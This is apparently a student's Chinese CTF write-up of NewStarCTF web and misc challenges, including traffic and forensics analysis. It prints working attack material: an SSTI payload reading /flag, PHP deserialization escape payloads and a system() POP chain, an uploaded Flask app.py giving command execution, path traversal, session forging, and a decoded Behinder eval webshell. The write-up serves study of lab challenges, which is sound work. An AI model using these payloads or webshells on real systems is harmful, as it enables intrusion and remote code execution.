echo (urlencode(@serialize($a)));
//echo (@serialize($a));
```

​		没有报错是真的了，但也是啥也没有回显；		

​		一看题解 考点是Bash盲注，好了，又是我不会的

![image-20240304233342115](../typora-user-images/image-20240304233342115.png)

能用非预期方法获取到flag

这是看题解如下

![image-20240304233427041](../typora-user-images/image-20240304233427041.png)

预期方法bash盲注我是不会的

非预期方法我现在大概明白了

​		首先`script` 命令默认会将记录的输出保存在当前用户的当前工作目录下，并将其写入名为 `typescript` 的文件中。所以，`hack` 文件应该被创建在当前用户的当前工作目录下。

可以先code="ls / | script hack"

​		这相当于将根目录的列举结果保存在当前目录的hack中，所以这时我们访问url/hack可以看到如下内容：

![image-20240304233757765](../typora-user-images/image-20240304233757765.png)

同理，我们继续执行 cat /flag_is_h3eeere | script mine

然后访问URL/mine  就可以得到flag了

![image-20240304233942548](../typora-user-images/image-20240304233942548.png)

​		这也是为什么题解说没给权限设死，如果没有权限的话(应该是**写入**权限)，就不能看到script记录的结果

​		目录必须存在并且具有写入权限，否则命令将无法成功执行。

​		这也让我知道bash和shell是两个东西，要搞清楚，要理解bash，我就是不理解bash，所以很懵。

​		按照我现在的理解就是shell执行一个命令比如ls，会直接回显给结果

​		而如果是bash，它同样执行这个命令，但命令的结果会保存在当前的这个值中

​		比如这里exec(ls)   我们无法看到ls的结果    除非ls |script  xxx    去看xxx文件来间接看结果；或者是

```php
$output=exec(ls);

echo $output;

echo exec(ls);
```

​		这样才能看到结果，总之好好看看bash，学习学习bash盲注。





### 第五题 Genshin ***

<img src="../typora-user-images/image-20240304234806774.png" alt="image-20240304234806774" style="zoom:50%;" />

原神！启动！   现在23:48   所以我又一次选择拖到明天再做。

![image-20240305103938419](../typora-user-images/image-20240305103938419.png)

找一些信息，先F12看一下吧，网页元素还有源代码都没啥东西，再看看标头有什么，发现一个可疑的字段

<img src="../typora-user-images/image-20240305104300871.png" alt="image-20240305104300871" style="zoom:50%;" />

去该页面下看看

![image-20240305104352864](../typora-user-images/image-20240305104352864.png)

GET传个参数看看，好像也没什么，还是用burp吧

就按它的意思吧，用GET给name传个参。

![image-20240305104828826](../typora-user-images/image-20240305104828826.png)

可以看到有响应了。

给name传什么就会打印什么，难道是一个echo？ 先试试吧

![image-20240305111409867](../typora-user-images/image-20240305111409867.png)

额，应该是一个echo打印，但是这里估计有检测，网站没有给出我们想要的结果。

![image-20240305111827141](../typora-user-images/image-20240305111827141.png)

接着就跟应急了似的，一直在这个页面了...

不是卡这个页面了，是因为后面的那个分号，去了之后就有正常打印了。

经过几次测试现在发现  单引号以及分号会检测

考点是SSTI，不懂

脚本小子 启动！https://github.com/Marven11/Fenjing

经过一波操作，我也成为了脚本小子的模样

![image-20240325210705352](../typora-user-images/image-20240325210705352.png)







![image-20240305115551489](../typora-user-images/image-20240305115551489.png)

<img src="../typora-user-images/image-20240305120842650.png" alt="image-20240305120842650" style="zoom:50%;" />

一点不会，这个payload更是看不懂，学学ssti吧

```php
{%print(([].__class__.__base__.__subclasses__()[132]|attr("__i""nit__")).__globals__)["pop""en"]("cat<>/flag").read()%}
```



### 第六题 OtenkiGirl ***

<img src="../typora-user-images/image-20240305142145344.png" alt="image-20240305142145344" style="zoom:50%;" />

这个什么什么girl意思是天气之子，看看吧

下面的描述是 下雨？传播？污染？

进入靶机看看

<img src="../typora-user-images/image-20240305142613851.png" alt="image-20240305142613851" style="zoom:50%;" />

很好的网站，一时之间不知道如何下手，填了信息之后下方就会出现一个便利贴

![image-20240305142819949](../typora-user-images/image-20240305142819949.png)

提交购物车请求，我们看到四个输入栏的内容，还有一个timestamp是什么呢？

![image-20240305142911629](../typora-user-images/image-20240305142911629.png)

响应包

应该能给输入栏写一些敏感命令去执行？

考点是 JavaScript 原型链污染

太难了太难了











## Week3 Misc

### 第一题 阳光开朗大男孩

下载题目附件

打开发现两个txt文件一个是一堆奇怪的表情符号(flag.txt) 一个是社会主义核心价值观密文(secret.txt)

先解密社会主义核心价值观

![image-20240303181732060](../typora-user-images/image-20240303181732060.png)

是一串密码    

那显然flag是被加密了，现在是有了这段表情符号的密钥，我们需要解密，去百度查询

<img src="../typora-user-images/image-20240303182045935.png" alt="image-20240303182045935" style="zoom:50%;" />

找了一个网站并不行，当时做就是这样，换个网站吧

麻了，找了好多，为什么找不到能解码的呢

我想我找到了，这里用的不是网上给出的一般答案，说是什么base100加密解密，

这里的emoji是使用了AES加密，要不然咋有密钥，虽然第一个网站我也不知道什么情况，有密钥也不对。

![image-20240303183551441](../typora-user-images/image-20240303183551441.png)

![image-20240303183702861](../typora-user-images/image-20240303183702861.png)

但是，这个网站很显然就解密了。

网址链接：https://aghorler.github.io/emoji-aes/



### 第二题 大怨种

这一题没啥好说的，主要是看你认不认这是什么码，可不是啥二维码

是汉信码，找一个网站识别一下就出来flag了

这里看这篇博客 比较有用   [条码分析](https://www.cnblogs.com/Mar10/p/17308774.html)



### 第三题 2-分析 ***

<img src="../typora-user-images/image-20240303183813090.png" alt="image-20240303183813090" style="zoom:67%;" />

附件是pcap，要分析流量

这题我一点思路没有，涉及到流量分析，真的只会看导出对象里的各种文件，跟翻垃圾似的，或者就是看捕获文件属性

​		**考点是HTTP流量分析、简单溯源**

先看攻击者登录使用的用户名，登录一般是POST请求，所以我们要过滤出所有的POST请求(一些基本的过滤请求要会)

![image-20240304103939120](../typora-user-images/image-20240304103939120.png)

![image-20240304104120167](../typora-user-images/image-20240304104120167.png)

存在敏感字段

由此推断登录用户名为best_admin

​		再看存在漏洞的文件名，还有Webshell文件名，仔细看附件的流量包，发现都是请求一个url，然后404报错，这应该是在进行漏洞扫描，我们可以先把404的流量包过滤掉

![image-20240304104907359](../typora-user-images/image-20240304104907359.png)

这很显然就是写入了一个webshell文件，文件名是wh1t3g0d.php

哪里存在这个漏洞呢，我看应该是index.php?

及具体说是index.php文件的page参数存在任意文件包含漏洞

所以有flag{md5(best_admin_index.php_wh1t3g0d.php)}

即flag(4069afd7089f7363198d899385ad688b)





### 第四题 键盘侠

题目又是给了一个数据包捕获文件，用wireshark打开

发现是一些USB流量包，结合题目，还有数据包中的HID Data字段，这应该是键盘设备

找到HID Data字段，共8个字节，第三个字节代表击剑信息

可以右键HID Data字段，点击应用为列，可以看到HID Data的数据包，但这个效果不怎么好

可以设置过滤器 usb.src == "1.15.1"  这些都是键盘流量，在文件----导出特定文件----写好文件名 即可将这些数据包导出

我们需要使用tshark命令对数据进行提取

![image-20240304153403109](../typora-user-images/image-20240304153403109.png)

```shell
tshark -r res.pcapng -T fields -e usb.capdata | sed '/^\s*$/d' > keyboard.txt
```

详细原理可见此博客

[**CTF流量分析常见题型(二)-USB流量**](https://blog.51cto.com/u_14449312/3867894)

反正最后是写脚本将提取出来的流量 这里是keyboard.txt中的转换为对应的键位，在网上抄的脚本跑不出来，用了官方题解的可以的，还没仔细看脚本是怎么写的，要仔细看一看，完了，一点代码都写不得，该咋办

反正最后跑出来的结果如下（我不知道为什么它开始要加个字母n...）

output:n

w3lc0m3<SPACE>to<SPACE>newstar<SPACE>ctf<SPACE>2023<SPACE>flag<SPACE>is<SPACE>here<SPACE>vvvvbaaaasffjjwwwwrrissgggjjaaasdddduuwwwwwwwwiiihhddddddgggjjjjjaa1112333888888<ESC><ESC>2hhxgbffffbbbnna	<CAP><CAP>ff<DEL>lll<DEL><DEL>aaa<DEL><DEL>gggg<DEL><DEL><DEL>[999<DEL><DEL>999<DEL><DEL>11<DEL>9aaa<DEL><DEL><SPACE><SPACE><DEL><DEL>eb2---<DEL><DEL>a450---<DEL><DEL>2f5f<SPACE><SPACE><SPACE><DEL><DEL><DEL>--<DEL>7bfc[unknown] [unknown] [unknown]-8989<DEL><DEL>dfdf<DEL><DEL>4bfa4bfa<DEL><DEL><DEL><DEL>85848584]]]<DEL><DEL><DEL><DEL><DEL><DEL><DEL>]]<SPACE><SPACE><SPACE><SPACE>nice<SPACE>work11yyoou<SPACE>ggot<SPACE>tthhis<SPACE>fllag

照着打一遍键盘

welcome to newstar ctf 2023 flag is here 

vvvvbaaaasffjjwwwwrrissgggjjaaasdddduuwwwwwwwwiiihhddddddgggjjjjjaa11123338888882hhxgbffffbbbnnaflag[9919aeb2-a450-2f5f-7bfc-89df4bfa8584]]

所以flag是flag[9919aeb2-a450-2f5f-7bfc-89df4bfa8584]

我不知道为什么我这里跑出来{}变成了[]      

做麻了这道题





### 第五题 滴滴滴

<img src="../typora-user-images/image-20240304161122117.png" alt="image-20240304161122117" style="zoom:50%;" />

下载附件，给了一个secret.jpg   还有一个奇怪的音频.wav

先看图片是什么

<img src="../typora-user-images/image-20240304161305933.png" alt="image-20240304161305933" style="zoom:50%;" />

可能采用隐写了，直接用stegsolve看一看

然后就是啥也看不出来，题目说密码就在滴滴滴中，我们就听听这个音频

显然是拨号机，可以根据声音来得出这段密码，那有什么用呢，可能就是用来解开图片中的内容，jpg图片要用到密码，我们需要看看是那种隐写技术

简单查了一下，关于jpg图片隐写，除了简单的宽高隐那就是要用到工具 stegdetect和jphide了

先用stegdetect检测隐写，再用jphide提取

博客 https://juejin.cn/post/7081437157541281805#heading-19

随便下了个工具，接下来就只要分析那段滴滴滴就行了

​		这里提到的工具 stegdetect    jphide     steghide   

​		然后jpg隐写还有F5(矩阵编码)     outguess    这些需要了解

现在来说拨号是什么，这里直接用工具 dtmf2num.exe

(贴博客 https://www.cnblogs.com/Jlay/p/unctf_2020.html)很有意思的ctf题解

![image-20240304164430906](../typora-user-images/image-20240304164430906.png)

接着我们使用jphide来看看这个jpg文件      52563319066

没啥用，不是这个，那就需要用stegdetect先进行探测

这里找stegdetect看到一个哈人的下载页  [Hacking Software Download Center](https://www.bookofnetwork.com/2576/download/Download-Stegdetect-software-for-PC-free)

![image-20240304165600313](../typora-user-images/image-20240304165600313.png)

没有......

![image-20240304170057130](../typora-user-images/image-20240304170057130.png)

兜兜转转还是把三个软件全下载了，看结果是要steghide来解密的，但我疑惑的是stegdetect没有检测出来么？ 

反正看上面得到了flag文件，让我们看看

![image-20240304170222636](../typora-user-images/image-20240304170222636.png)

得到flag了(为什么文档里的下划线也不显示了 乐)





## Week4 Web

### 第一题 逃

<img src="../typora-user-images/image-20240305144157479.png" alt="image-20240305144157479" style="zoom:50%;" />

![image-20240305144225894](../typora-user-images/image-20240305144225894.png)

很显然这是一道字符串增多逃逸问题

O:7:"GetFlag":2:{s:3:"key";s:5:"hello";s:3:"cmd";s:2:"ls";}

O:7:"GetFlag":2:{s:3:"key";s:15:"badbadbadbadbad";s:3:"cmd";s:2:"ls";s:3:"cmd";s:6:"whoami";}

O:7:"GetFlag":2:{s:3:"key";s:15:"goodgoodgoodgoodgood";s:3:"cmd";s:6:"whoami";}

看视频的忘记干净了   [PHP反序列化字符串逃逸](https://www.cnblogs.com/v2ish1yan/articles/16113296.html)

构造代码：

```php
<?php
function waf($str){
    return str_replace("bad","good",$str);
}
class GetFlag {
    public $key;
    public $cmd = "whoami";
    public function __construct($key)
    {
        $this->key = $key;
    }
    public function __destruct()
    {
        system($this->cmd);
    }
}


echo serialize(new GetFlag('ls /'));
echo waf(serialize(new GetFlag('badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad";s:3:"cmd";s:7:"cat /f*";}')));
echo "\n";
echo urlencode('badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad";s:3:"cmd";s:7:"cat /f*";}');
//unserialize(waf());
```

运行结果：

```php
O:7:"GetFlag":2:{s:3:"key";s:4:"ls /";s:3:"cmd";s:6:"whoami";}laptop-5b9o2u5a\lyra
O:7:"GetFlag":2:{s:3:"key";s:108:"goodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgood";s:3:"cmd";s:7:"cat /f*";}";s:3:"cmd";s:6:"whoami";}
badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad%22%3Bs%3A3%3A%22cmd%22%3Bs%3A7%3A%22cat+%2Ff%2A%22%3B%7D
```

​		总的就是说，bad会被替换为good，每有一个bad就会多出来一个字符，让多出来的字符占用原本属于";s:3:"cmd";s:7:"cat /f*";}的位置，从而让";s:3:"cmd";s:7:"cat /f*";}逃逸出去而成功执行。

​		在php代码中，序列化时最好用单引号括住‘  ’。。。php打印时，还有序列化的结果是要使用双引号进行闭合，并判断闭合的内容。

​		序列化结果以 ;} 为结束标志，后面的内容不起作用，构造时就默认把  ”; 算上，这是要闭合前面的内容的。

​		所以最后的payload为

```
?key=badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad%22%3Bs%3A3%3A%22cmd%22%3Bs%3A7%3A%22cat+%2Ff%2A%22%3B%7D
```

可以得到flag{4d28ff82-2935-4381-93a8-32eed496d8d4}

![image-20240315160846758](../typora-user-images/image-20240315160846758.png)



### 第二题 More Fast

<img src="../typora-user-images/image-20240315161022126.png" alt="image-20240315161022126" style="zoom:50%;" />

[PHP反序列化入门之常见魔术方法](https://mochazz.github.io/2019/01/29/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E4%B9%8B%E5%B8%B8%E8%A7%81%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/#sleep)

进入靶机

题目为什么说destruct能早一点触发就好了？网页代码显示就Start有一个析构函数啊，而且内容是die。####

![image-20240315210713539](../typora-user-images/image-20240315210713539.png)

反序列化的题目，看代码执行点应该是在Web这个类中

evil函数     简单的可以$func=system    $var=ls /  ;

那么如何执行Web类中的evil函数呢?

Pwn类中有调用evil函数的   需要调用函数的方式去调用对象以触发魔术方法

可以在Reverse类中去触发这个魔术方法，而在Re类中则需要_get触发，访问不可访问属性值

这个需要在Crypto类中，该对象被作为字符串时可以触发，需要Start

所以有pop链

Start----Crypto----Reverse----Pwn----Web

析构函数确实需要早一点触发，不然toString魔术方法无法正常触发，那就构造失败了

看官方题解，这里构造的代码应该没问题

```php
<?php
class Start{
    public $errMsg;
    public function __construct()
    {
       $this->errMsg=new Crypto();
    }

}
class Pwn{
    public $obj;
    public function __construct()
    {
        $this->obj=new Web();
    }

}

class Reverse{
    public $func;
    public function __construct()
    {
        $this->func=new Pwn();
    }

}

class Web{
    public $func;
    public $var;
    public function __construct()
    {
        $this->func="system";
        $this->var="ls /";
    }

}

class Crypto{
    public $obj;
    public function __construct()
    {
        $this->obj=new Reverse();
    }

}

class Misc{

}
$a=new Start();
echo @serialize($a);
echo "\n";
echo urlencode(@serialize($a));
```

难点在于反序列化位点的抛出异常

```php
$a = @unserialize($_POST['fast']);
throw new Exception("Nope");
```

为什么会这样呢？

​		我们要知道，销毁对象的过程通常称为垃圾回收（Garbage Collection）。PHP 的垃圾回收机制是自动的，会在对象不再被引用或无法访问时将其标记为垃圾，并最终回收内存。在对象被销毁时，如果定义了析构函数（即 `__destruct()` 魔术方法），则会自动调用该方法。

​		但是，当 PHP 脚本抛出异常并在异常处理过程中终止时，对象的销毁过程可能会受到影响。在这种情况下，PHP 不会自动销毁对象，也就无法调用对象的 `__destruct()` 方法。这种情况下，脚本的执行状态会从正常状态变为异常状态，并在异常处理过程中停止执行。

​		题目代码中，`throw new Exception("Nope");` 这行代码执行成功并抛出了异常（Fatal error）。在这些情况下，由于异常被抛出并导致脚本终止，`$a` 对象没有机会进行正常的销毁过程，因此 `Start` 类的 `__destruct()` 方法不会被触发。

​		在 PHP 中，垃圾回收机制是通过引用计数来实现的。当一个对象被创建时，它的引用计数为 1。每当有一个新的引用指向该对象时，引用计数就会增加 1。相反，当一个引用不再指向该对象时，引用计数就会减少 1。当对象的引用计数归零时，垃圾回收机制会将其标记为垃圾，并在适当的时候销毁对象。

​		在触发垃圾回收机制并销毁对象时，如果该对象定义了析构函数（即 `__destruct()` 方法），则会自动调用该方法。因此，在正常情况下，当对象的引用计数归零时，它会被销毁，并且 `__destruct()` 方法会被调用。

​		想要提前触发异常这里有三种方法：

​		使得数组对象为 NULL：当一个数组中的元素指向一个对象，而该数组被置为 NULL 时，会导致对象的引用计数减少。如果对象的引用计数归零，垃圾回收机制会将其标记为垃圾并销毁对象。同样地，如果对象定义了 __destruct() 方法，该方法也会被自动调用。

​		去掉序列化后最后一个中括号

​		修改属性数字

原文链接：https://blog.csdn.net/2301_76690905/article/details/133995517

​		原文中是采用了第一种方法，这里我尝试第二种和第三种，看起来也比较简单 

首先是第二种

先说上面代码的结果

```php
O:5:"Start":1:{s:6:"errMsg";O:6:"Crypto":1:{s:3:"obj";O:7:"Reverse":1:{s:4:"func";O:3:"Pwn":1:{s:3:"obj";O:3:"Web":2:{s:4:"func";s:6:"system";s:3:"var";s:4:"ls /";}}}}}
O%3A5%3A%22Start%22%3A1%3A%7Bs%3A6%3A%22errMsg%22%3BO%3A6%3A%22Crypto%22%3A1%3A%7Bs%3A3%3A%22obj%22%3BO%3A7%3A%22Reverse%22%3A1%3A%7Bs%3A4%3A%22func%22%3BO%3A3%3A%22Pwn%22%3A1%3A%7Bs%3A3%3A%22obj%22%3BO%3A3%3A%22Web%22%3A2%3A%7Bs%3A4%3A%22func%22%3Bs%3A6%3A%22system%22%3Bs%3A3%3A%22var%22%3Bs%3A4%3A%22ls+%2F%22%3B%7D%7D%7D%7D%7D
```

​		去掉最后一个中括号

![image-20240316214431905](../typora-user-images/image-20240316214431905.png)

​		修改属性数字，这里说的应该是对象中属性的个数，本来是1，我们修改为2个，可以提前触发异常。

![image-20240316214742057](../typora-user-images/image-20240316214742057.png)

至于字符过滤，可以直接通过通配符进行绕过，比如f*。





### 第三题 midsql ***

<img src="../typora-user-images/image-20240316215022015.png" alt="image-20240316215022015" style="zoom:50%;" />

​		sql注入，可以用sqlmap么？

​		sqlmap使用屡次受挫，明明能检测出来是时间盲注，但又说参数id不是注入点，但是事实是注入点就是id，当然由于过滤了空格，所以需要使用注释符号/**/来代替空格的位置，sqlmap也支持这种替换 需要参数 --tamper sapce2comment



### 第四题 flask disk

<img src="../typora-user-images/image-20240319184122719.png" alt="image-20240319184122719" style="zoom: 67%;" />

flask web服务框架，存在漏洞，disk是什么，磁盘？ 运行在5000端口上

打开靶机

<img src="../typora-user-images/image-20240319184318080.png" alt="image-20240319184318080" style="zoom:67%;" />

第一个list files进去是显示app.py文件的详细信息，应该就是当前目录的文件吧，也说明确实是flask

第二个是一个上传文件处，还没怎么尝试

第三个是一个控制台

<img src="../typora-user-images/image-20240319184545669.png" alt="image-20240319184545669" style="zoom:50%;" />

​		但是会提示锁定，控制台已锁定，需要通过输入PIN解锁。您可以在运行服务器的shell的标准输出上找到打印出来的PIN。说明这应该是一个root权限的控制台么，需要我们先获取服务器的shell来获得pin。

​		那现在来看切入点就是上传文件处了。

<img src="../typora-user-images/image-20240319185022144.png" alt="image-20240319185022144" style="zoom:50%;" />

简单传了几个东西，但是我现在好奇的是传的东西在哪了？

简单抓包也没看见有什么。

*看题解考点####是Phar反序列化，gzip压缩，无回显RCE*

这里考点写错了，因为没一点关系，应该是和上一个题解PharOne的弄混了

这里需要注意的是发现admin管理要输入pin码的话，说明flask开启了debug模式

**而flask开启了debug模式下，app.py源文件被修改后会立刻加载。**

所以只需要上传一个能rce的app.py文件把原来的进行覆盖就能够rce，(语法不能出错，否则会崩溃)

这是一种方法，[可能的另一种方法 ](https://ctf.anzu.link/pages/204626/#flask%E4%B8%AD%E7%9A%84debug%E6%A8%A1%E5%BC%8F%E5%AF%BC%E8%87%B4%E7%9A%84%E6%89%A7%E8%A1%8C%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81)     Flask PIN码生成终端RCE也是一种题型，需要关注。

这里app.py不会写，就抄官网的了

```python
from flask import Flask,request
import os
app=Flask(__name__)
@app.route('/')
def index():
    try:
        cmd = request.args.get('cmd')
        data=os.popen(cmd).read()
        return data
    except:
        pass

​    return "1"
if __name__=='__main__':
​    app.run(host='0.0.0.0',port=5000,debug=True)
```

正好看看是在哪个目录下，    /app

<img src="../typora-user-images/image-20240319193433612.png" alt="image-20240319193433612" style="zoom:67%;" />



所以考点也不是让你爆PIN，而是知道debug模式下flask的特性，然后利用上传进行rce。





[flask漏洞利用小结](https://inhann.top/2021/02/25/flask_newer/)

[一个有用的博客](https://www.tr0y.wang/)  对python的还有ssti的题做了好多记录





### 第五题 InjectMe

<img src="../typora-user-images/image-20240319193720541.png" alt="image-20240319193720541" style="zoom:50%;" />

注入，先开启靶机看看，题目还给了一个附件Dockerfile

进入网页后，没什么可以交互的，就开启控制台看看网页元素，其中一个地方有个url还有base64 后面跟着一长串编码，这个还没复制下来，不知道什么内容

![image-20240319194351234](../typora-user-images/image-20240319194351234.png)

另外就是，网页上的图片显示，靠近元素后会有提示/cancanneed?这一个目录，所以我们可以前往这个目录，然后就发现网页存了一些图片，参数file来指定。其中一张

<img src="../typora-user-images/image-20240319194557620.png" alt="image-20240319194557620" style="zoom:67%;" />

​		这段代码是一个 Flask 路由处理函数，用于处理文件下载请求。具体来说，当客户端发送 GET 请求到 `/download` 路径时，它会尝试获取名为 `file` 的参数，然后检查该文件是否存在，如果存在且不是以 `start` 开头的文件名，则将文件发送给客户端进行下载；否则，返回 500 错误。

​		这段代码还对文件名进行了一定的安全处理，使用 `os.path.join()` 方法将文件名拼接到静态文件夹路径 `'static/img/'` 下，同时替换掉 `../` 避免路径遍历漏洞。这样做可以增强代码的安全性，防止恶意用户尝试访问系统中的敏感文件。

那么该怎么办？   考点是目录穿越+session伪造+SSTI bypass

​		首先目录穿越如何实现，这里是替换掉了../但我们审计源码发现只是简单的单次替换，所以可以采用..././这样经过一次替换后，我们依然存在../来进行目录穿越，dockerfile的作用是它给我们泄露了相关目录，所以我们可以穿越到我们想看的那些目录。

![image-20240319200303969](../typora-user-images/image-20240319200303969.png)

Dockerfile 是用于构建 Docker 镜像的文本文件，其中包含了构建镜像所需的指令和参数。

​		当然目录穿越是要看前面泄露的那张图，肯定还是要有参数file的，我竟然忘加参数了，我说怎么没结果...  还有就是，要在cancanneed目录下，或者download下面

<img src="../typora-user-images/image-20240319201745169.png" alt="image-20240319201745169" style="zoom:67%;" />

可以看到网站源码

![image-20240319201834900](../typora-user-images/image-20240319201834900.png)

发现一个可疑的页面

但需要绕过session验证   验证需要secret_key吧    不清楚，没了解过这方面知识

去哪找？首先去/etc/passwd看

<img src="../typora-user-images/image-20240319202321138.png" alt="image-20240319202321138" style="zoom:67%;" />

并没有什么内容

![image-20240319202428478](../typora-user-images/image-20240319202428478.png)



还是需要仔细审计源码，所以可以知道secret_key是在config.py中，应该是同目录下的

![image-20240319202532180](../typora-user-images/image-20240319202532180.png)

得到secret_key = "y0u_n3ver_k0nw_s3cret_key_1s_newst4r"

接下来就是session伪造+SSTI bypass了  首先伪造的话我要弄懂这段代码

```python
@app.route('/backdoor', methods=["GET"])
def backdoor():
    try:
        print(session.get("user"))
        if session.get("user") is None:
            session['user'] = "guest"
        name = session.get("user")
        if re.findall(
                r'__|{{|class|base|init|mro|subclasses|builtins|globals|flag|os|system|popen|eval|:|\+|request|cat|tac|base64|nl|hex|\\u|\\x|\.',
                name):
            abort(500)
        else:
            return render_template_string(
                '竟然给<h1>%s</h1>你找到了我的后门，你一定是网络安全大赛冠军吧！😝 <br> 那么 现在轮到你了!<br> 最后祝您玩得愉快!😁' % name)
    except Exception:
        abort(500)
```

不懂了已经不懂了，看题解也不懂了  *#o#*      

代码照着抄好，运行良好，但不知道有什么用

https://blog.csdn.net/m0_73512445/article/details/133694293

看这里的题解，不管怎么说都该有结果的，但我复现不出来了

[CTF中Python_Flask应用的一些解题方法总结](https://blog.lxscloud.top/2022/10/09/CTF%E4%B8%ADPython_Flask%E5%BA%94%E7%94%A8%E7%9A%84%E4%B8%80%E4%BA%9B%E8%A7%A3%E9%A2%98%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/)

​		时隔几周再战此题目，这次努力找题解看看能不能复现出来，也看了些相关的资料，对session伪造方面的内容也了解了一些，也是认识到Python Flask题型的重要性，不能忽略，还有就是SSTI一定要学了

​		因为就是官方题解跑不通，我现在又找到了一位博客上发的wp，他也是直接用的官方的题解来构造SSTI的payload的，但他没有官方后面的re请求直接在python上获得结果。前面的session_data和官方一模一样的啊。

​		抱着试一试的想法，我又新建py文件，跑了一下，将伪造的结果session发包，结果就能获取flag了(悲)    到底为什么

<img src="../typora-user-images/image-20240404225410952.png" alt="image-20240404225410952" style="zoom:67%;" />

将官方wp的后半部分移动过来

![image-20240404225630617](../typora-user-images/image-20240404225630617.png)

python中也获取结果了

​		现在的想法就是估计我是copycv大法官方题解，可可能一些空格啥的复制粘贴每处理好，导致payload啥的估计有问题，而这种在博客里直接复制粘贴的代码就没问题了。(我只能这样想了，因为一对比，真就和官方的一模一样，而一样的代码，一个有结果，一个没结果，不知道哪里出了问题，反正肯定是cv时出现问题了！)

​		最终flag{134557e3-b828-4774-af2f-d31d9e2613a3}

​		参考的这位博主记录了newstarCTF的题，所以记一下链接

​		https://www.cnblogs.com/EddieMurphy-blogs/p/17782079.html





第六题 

















## Week4 Misc

### 第一题 R通大残

​		附件是一张png，直接用stegsolve把图片的R通道全打上就行了，可以获取到隐藏的flag

### 第二题 Nmap

<img src="../typora-user-images/image-20240305213136732.png" alt="image-20240305213136732" style="zoom:50%;" />

流量分析题目

![image-20240305213539111](../typora-user-images/image-20240305213539111.png)

考点是namp，SYN扫描流量分析

原理：https://blog.csdn.net/weixin_41905135/article/details/124541161

![image-20240305215046102](../typora-user-images/image-20240305215046102.png)

tcp.flags.syn ==1 && tcp.flags.ack ==1

所以flag{80,3306,5000,7000,8021,9000}

需要掌握一些基本的Wireshark过滤器语法，哪怕用gpt

<img src="../typora-user-images/image-20240307232346068.png" alt="image-20240307232346068" style="zoom:67%;" />







### 第三题 依旧是空白

<img src="../typora-user-images/image-20240305215601944.png" alt="image-20240305215601944" style="zoom:50%;" />

![image-20240305215659240](../typora-user-images/image-20240305215659240.png)

给了两个文件，一个txt文件，一个是png图片。

我不知道为什么题解说根据题目提示很容易就检阅到snow隐写的知识点

### [收录CTF MISC方向中使用的在线工具网站](https://blog.51cto.com/u_16159500/6517104)

这里题解给了一个在线的snow隐写解密，但是我看别人使用的话，是要填写一个url来进行解密，所以如果要采取在线解密方法的话，那就需要搭建一个本地网页localhost，感觉麻烦，主要是之前没搞过，懒得研究，直接下载了exe文件来解密

至于snow隐写需要的密码自然就藏在png图片中了，可能就是宽高隐藏了，在winhex中修改一下高度

**(png图片的宽高是在第17字节开始的到第24个字节，前四字节是宽，后四字节是高)**

![image-20240307231630417](../typora-user-images/image-20240307231630417.png)

可以看到密码 s00_b4by_f0r_y0u

![image-20240307231837584](../typora-user-images/image-20240307231837584.png)

解密得到flag

其实snow隐写就是HTML中的隐写，这一点要知道

参考博客 https://blog.51cto.com/u_15400016/4292784





### 第四题 3-溯源 ***

<img src="../typora-user-images/image-20240307232134867.png" alt="image-20240307232134867" style="zoom:50%;" />

这道题目和1-序章，2-分析是一脉相承的

取巧就是看上一道题目也就是2-分析 中我们知道有一个shell：wh1t3g0d.php

以此继续分析，但是这个命令要知道哇

http.request.uri.path contains "wh1t3g0d.php"

<img src="../typora-user-images/image-20240308110504886.png" alt="image-20240308110504886" style="zoom:67%;" />

内容如上

这个命令实际上是一个 HTTP 请求，它试图访问名为 `wh1t3g0d.php` 的文件，并传递了一个参数 `a`，其值为 `echo "<?php eval(\$_POST['test']); ?>" > shell.php`。

也就是说这个请求的目的是向 `wh1t3g0d.php` 文件传递了一段 PHP 代码，并将这段代码写入到名为 `shell.php` 的文件中。

因此我们继续跟踪shell.php

![image-20240308110945866](../typora-user-images/image-20240308110945866.png)

为什么这里没有uri.path了

<img src="../typora-user-images/image-20240308111220720.png" alt="image-20240308111220720" style="zoom:80%;" />

写入了1.php文件

文件内容是base64编码，我们解密看看

```php
<?php
@error_reporting(0);
session_start();
    $key="e45e329feb5d925b";
	$_SESSION['k']=$key;
	session_write_close();
	$post=file_get_contents("php://input");
	if(!extension_loaded('openssl'))
	{
		$t="base64_"."decode";
		$post=$t($post."");
		
		for($i=0;$i<strlen($post);$i++) {
    			 $post[$i] = $post[$i]^$key[$i+1&15]; 
    			}
	}
	else
	{
		$post=openssl_decrypt($post, "AES128", $key);
	}
    $arr=explode('|',$post);
    $func=$arr[0];
    $params=$arr[1];
	class C{public function __invoke($p) {eval($p."");}}
    @call_user_func(new C(),$params);
?>
```

题解说很明显的冰蝎shell，

知key为e45e329feb5d925b，流量采用AES CBC 128加密

![image-20240308111933750](../typora-user-images/image-20240308111933750.png)

后续也都是与1.php进行交互

导出特定分组

最后在tcp.stream eq 19 可以获取用户名

但是我不理解我找其他的AES解密都解不出来，用题解给的那个网站确实是出来了结果

{"status":"c3VjY2Vzcw==","msg":"d3d3LWRhdGEK"}

base64解密就是状态success，msg是www-data

IP地址

![image-20240308114506481](../typora-user-images/image-20240308114506481.png)

![image-20240308114512427](../typora-user-images/image-20240308114512427.png)

<img src="../typora-user-images/image-20240308114523123.png" alt="image-20240308114523123" style="zoom:50%;" />

是172.17.0.2

flag{www-data_172.17.0.2}







### 第五题 第一次取证 ***

说到取证题，想到了强网杯遇到的那个取证题，当时简单了解了取证要用vol，

#### [Linux内存取证](http://www.s1mh0.xyz/blog/index.php/2023/12/20/linux_ncqz/)

需要在kali上安装volatility

参考博客 https://www.cnblogs.com/Jinx8823/p/16642215.html

**官网可能的安装地址:**https://downloads.volatilityfoundation.org/releases/

竟然在这:https://github.com/volatilityfoundation/volatility/releases

关键字搜索:volatility下载安装https://downloads.volatilityfoundation.org/releases/

